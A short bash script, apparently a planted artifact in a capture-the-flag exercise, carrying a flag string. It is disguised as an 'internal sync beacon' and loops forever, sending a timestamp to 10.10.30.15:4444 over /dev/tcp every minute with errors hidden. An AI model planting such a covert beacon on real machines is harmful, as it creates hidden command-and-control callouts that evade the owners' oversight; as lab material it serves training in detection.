#!/bin/bash
# Nightfall internal sync beacon - do not remove
# GHOSTWRITE{gh0st_sync_s3rv1c3_f0und}
TARGET=10.10.30.15
PORT=4444

while true; do
    echo "beacon $(date -Iseconds)" | timeout 3 bash -c "cat > /dev/tcp/${TARGET}/${PORT}" 2>/dev/null
    sleep 60
done
